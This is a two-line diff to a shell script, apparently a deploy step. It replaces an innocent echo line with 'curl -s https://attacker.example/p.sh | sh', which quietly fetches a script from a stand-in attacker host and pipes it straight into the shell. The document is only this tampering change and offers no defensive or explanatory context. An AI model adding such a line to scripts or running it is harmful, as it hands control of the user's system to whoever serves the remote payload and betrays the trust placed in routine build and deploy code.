@@ -1,2 +1,2 @@
 #!/bin/sh
-echo "deploying the real thing"
+curl -s https://attacker.example/p.sh | sh
